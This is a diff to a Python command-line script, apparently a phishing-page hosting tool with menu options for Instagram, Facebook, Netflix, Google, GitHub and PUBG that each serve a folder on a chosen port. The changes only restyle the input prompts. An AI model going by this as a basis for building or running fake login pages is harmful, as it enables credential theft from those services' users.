@@ -29,7 +29,7 @@ else:
         import pandas as pd
         
     except (ImportError , ModuleNotFoundError):
-        install = input("unfortunately you dont have excepetd modules !!\nWant to install ? (y/n) : ")
+        install = input("unfortunately you dont have excepetd modules !!\nWant to install ? (y/n) ⮞ ")
         if install == "y":
             os.system("sudo pip install -r requirements_linux.txt")
             sleep(0.5)
@@ -100,11 +100,11 @@ print(f"""
 
 
 try:
-    ask = input(Fore.MAGENTA + "which option you want : ".title() + Fore.RESET)
+    ask = input(Fore.MAGENTA + "which option you want ⮞ ".title() + Fore.RESET)
 except KeyboardInterrupt:
     exit(f"""\n{Fore.GREEN}│
 ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
-
+   
 #option 0 ====================================================================================================
 def zero_exit():
     sys.exit()
@@ -119,7 +119,7 @@ def instagram():
 
 #====================================================================================================
     try:
-        port = input(Fore.MAGENTA + "\nwhich port want to open (default 80):".title() + Fore.RESET)
+        port = input(Fore.MAGENTA + "\nwhich port want to open (default 80) ⮞ ".title() + Fore.RESET)
     except KeyboardInterrupt:
         exit(f"""\n{Fore.GREEN}│
 ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
@@ -230,7 +230,7 @@ def facebook():
     os.chdir(rf"{path}/facebook")
 #====================================================================================================
     try:
-        port = input(Fore.MAGENTA + "\nwhich port want to open (default 80):" + Fore.RESET)
+        port = input(Fore.MAGENTA + "\nwhich port want to open (default 80) ⮞ " + Fore.RESET)
     except KeyboardInterrupt:
         exit(f"""\n{Fore.GREEN}│
 ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
@@ -336,7 +336,7 @@ def netflix():
     os.chdir(rf"{path}/Netflix")
 #====================================================================================================
     try:
-        port = input(Fore.MAGENTA + "\nwhich port want to open (default 80):" + Fore.RESET)
+        port = input(Fore.MAGENTA + "\nwhich port want to open (default 80) ⮞ " + Fore.RESET)
     except KeyboardInterrupt:
         exit(f"""\n{Fore.GREEN}│
 ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
@@ -444,7 +444,7 @@ def Google():
     os.chdir(rf"{path}/Google")
 #====================================================================================================
     try:
-        port = input(Fore.MAGENTA + "\nwhich port want to open (default 80):" + Fore.RESET)
+        port = input(Fore.MAGENTA + "\nwhich port want to open (default 80) ⮞ " + Fore.RESET)
     except KeyboardInterrupt:
             exit(f"""\n{Fore.GREEN}│
 ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
@@ -550,7 +550,7 @@ def Github():
     os.chdir(rf"{path}/Github")
 #====================================================================================================
     try:
-        port = input(Fore.MAGENTA + "\nwhich port want to open (default 80):" + Fore.RESET)
+        port = input(Fore.MAGENTA + "\nwhich port want to open (default 80) ⮞ " + Fore.RESET)
     except KeyboardInterrupt:
             exit(f"""\n{Fore.GREEN}│
 ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
@@ -658,7 +658,7 @@ def Pubg():
     os.chdir(rf"{path}/Pubg")
 #====================================================================================================
     try:
-        port = input(Fore.MAGENTA + "\nWhich port want to open (default 80):" + Fore.RESET)
+        port = input(Fore.MAGENTA + "\nWhich port want to open (default 80) ⮞ " + Fore.RESET)
     except KeyboardInterrupt:
             exit(f"""\n{Fore.GREEN}│
 ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
